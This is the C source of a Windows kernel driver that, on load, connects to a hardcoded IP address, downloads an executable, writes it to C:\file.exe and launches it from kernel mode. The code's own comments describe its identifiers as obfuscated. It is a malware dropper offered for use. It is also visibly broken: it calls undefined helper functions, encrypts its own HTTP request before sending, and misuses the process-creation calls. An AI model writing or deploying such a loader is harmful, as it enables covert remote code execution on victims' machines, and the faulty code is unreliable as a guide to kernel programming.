// YATTTAAAA ❗❗❗❗❗
// <3
//-------------------
#include <ntddk.h>
#include <wsk.h>
#include <bcrypt.h>

// Obfuscated identifiers
PWSK_SOCKET s = NULL;
WSK_REGISTRATION reg;
WSK_PROVIDER_NPI np;
BCRYPT_ALG_HANDLE algHandle = NULL;
BCRYPT_KEY_HANDLE keyHandle = NULL;

VOID UnloadDriver(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    if (keyHandle) {
        BCryptDestroyKey(keyHandle);
    }
    if (algHandle) {
        BCryptCloseAlgorithmProvider(algHandle, 0);
    }
    WSKCleanup();
    KdPrint(("Driver Unloaded\n"));
}

NTSTATUS InitializeWSK(VOID)
{
    NTSTATUS status;
    WSK_CLIENT_DISPATCH clientDispatch = {
        MAKE_WSK_VERSION(1, 0),
        0,
        NULL
    };

    WSK_CLIENT_NPI clientNPI = {
        &clientDispatch,
        NULL
    };

    status = WskRegister(&clientNPI, &reg);
    if (!NT_SUCCESS(status)) {
        KdPrint(("WSK Registration Failed: 0x%X\n", status));
        return status;
    }

    status = WskCaptureProviderNPI(&reg, WSK_INFINITE_WAIT, &np);
    if (!NT_SUCCESS(status)) {
        KdPrint(("WSK Provider Capture Failed: 0x%X\n", status));
        WskDeregister(&reg);
        return status;
    }

    return STATUS_SUCCESS;
}

VOID CleanupWSK(VOID)
{
    if (np.Client != NULL) {
        WskReleaseProviderNPI(&reg);
    }
    WskDeregister(&reg);
}

NTSTATUS InitializeEncryption(VOID)
{
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&algHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to Open Algorithm Provider: 0x%X\n", status));
        return status;
    }

    status = BCryptGenerateSymmetricKey(algHandle, &keyHandle, NULL, 0, (PUCHAR)"your_key_here", 16, 0);
    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to Generate Symmetric Key: 0x%X\n", status));
        BCryptCloseAlgorithmProvider(algHandle, 0);
        return status;
    }

    return STATUS_SUCCESS;
}

NTSTATUS DownloadAndDecryptFile(VOID)
{
    NTSTATUS status;
    SOCKADDR_IN addr;
    PWSK_PROVIDER_NPI providerNpi = &np;

    RtlZeroMemory(&addr, sizeof(SOCKADDR_IN));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    addr.sin_addr.S_un.S_addr = inet_addr("158.01.32.99");

    status = providerNpi->Dispatch->WskSocket(
        providerNpi->Client,
        AF_INET,
        SOCK_STREAM,
        IPPROTO_TCP,
        WSK_FLAG_BASIC_SOCKET,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        &s
    );
    if (!NT_SUCCESS(status)) {
        KdPrint(("WSK Socket Creation Failed: 0x%X\n", status));
        return status;
    }

    status = providerNpi->Dispatch->WskConnect(
        s,
        (PSOCKADDR)&addr,
        0,
        NULL,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        KdPrint(("WSK Socket Connection Failed: 0x%X\n", status));
        return status;
    }

    CHAR request[] = "GET /path/to/file.exe HTTP/1.1\r\nHost: 158.01.32.99\r\n\r\n";
    CHAR encryptedResponse[1024];
    ULONG encryptedResponseLength;

    status = EncryptData((PUCHAR)request, sizeof(request) - 1, (PUCHAR)encryptedResponse, &encryptedResponseLength);
    if (!NT_SUCCESS(status)) {
        KdPrint(("Encryption Failed: 0x%X\n", status));
        return status;
    }

    WSK_BUF sendBuffer = { 0 };
    sendBuffer.Mdl = IoAllocateMdl(encryptedResponse, encryptedResponseLength, FALSE, FALSE, NULL);
    if (!sendBuffer.Mdl) {
        KdPrint(("Failed to Allocate MDL\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    MmBuildMdlForNonPagedPool(sendBuffer.Mdl);
    sendBuffer.Offset = 0;
    sendBuffer.Length = encryptedResponseLength;

    status = providerNpi->Dispatch->WskSend(
        s,
        &sendBuffer,
        0,
        NULL,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        KdPrint(("WSK Send Failed: 0x%X\n", status));
        return status;
    }

    CHAR responseBuffer[1024];
    WSK_BUF receiveBuffer = { 0 };
    receiveBuffer.Mdl = IoAllocateMdl(responseBuffer, sizeof(responseBuffer), FALSE, FALSE, NULL);
    if (!receiveBuffer.Mdl) {
        KdPrint(("Failed to Allocate MDL\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    MmBuildMdlForNonPagedPool(receiveBuffer.Mdl);
    receiveBuffer.Offset = 0;
    receiveBuffer.Length = sizeof(responseBuffer);

    status = providerNpi->Dispatch->WskReceive(
        s,
        &receiveBuffer,
        0,
        NULL,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        KdPrint(("WSK Receive Failed: 0x%X\n", status));
        return status;
    }

    ULONG decryptedLength;
    CHAR decryptedResponse[1024];
    status = DecryptData((PUCHAR)responseBuffer, sizeof(responseBuffer), (PUCHAR)decryptedResponse, &decryptedLength);
    if (!NT_SUCCESS(status)) {
        KdPrint(("Decryption Failed: 0x%X\n", status));
        return status;
    }

    HANDLE fileHandle;
    OBJECT_ATTRIBUTES objAttrs;
    IO_STATUS_BLOCK ioStatusBlock;
    UNICODE_STRING filePath = RTL_CONSTANT_STRING(L"\\??\\C:\\file.exe");

    InitializeObjectAttributes(&objAttrs, &filePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = ZwCreateFile(
        &fileHandle,
        GENERIC_WRITE,
        &objAttrs,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to Create File: 0x%X\n", status));
        return status;
    }

    status = ZwWriteFile(
        fileHandle,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        decryptedResponse,
        decryptedLength,
        NULL,
        NULL
    );
    ZwClose(fileHandle);

    return status;
}

NTSTATUS ExecuteDownloadedFile(VOID)
{
    UNICODE_STRING filePath = RTL_CONSTANT_STRING(L"\\??\\C:\\file.exe");
    OBJECT_ATTRIBUTES objAttrs;
    InitializeObjectAttributes(&objAttrs, &filePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    HANDLE hProcess;
    CLIENT_ID clientId;
    NTSTATUS status = ZwCreateUserProcess(
        &hProcess,
        NULL,
        &objAttrs,
        NULL,
        NULL,
        NULL,
        PROCESS_ALL_ACCESS,
        0,
        NULL,
        NULL,
        &clientId
    );
    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to Create Process: 0x%X\n", status));
        return status;
    }

    status = ZwResumeProcess(hProcess);
    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to Resume Process: 0x%X\n", status));
        return status;
    }

    ZwClose(hProcess);
    return STATUS_SUCCESS;
}

extern "C" NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT   DriverObject,
    _In_ PUNICODE_STRING  RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = UnloadDriver;

    NTSTATUS status = InitializeWSK();
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = InitializeEncryption();
    if (!NT_SUCCESS(status)) {
        CleanupWSK();
        return status;
    }

    status = DownloadAndDecryptFile();
    if (!NT_SUCCESS(status)) {
        KdPrint(("File Download Failed: 0x%X\n", status));
        CleanupWSK();
        return status;
    }

    status = ExecuteDownloadedFile();
    if (!NT_SUCCESS(status)) {
        KdPrint(("File Execution Failed: 0x%X\n", status));
    }

    CleanupWSK();
    return status;
}
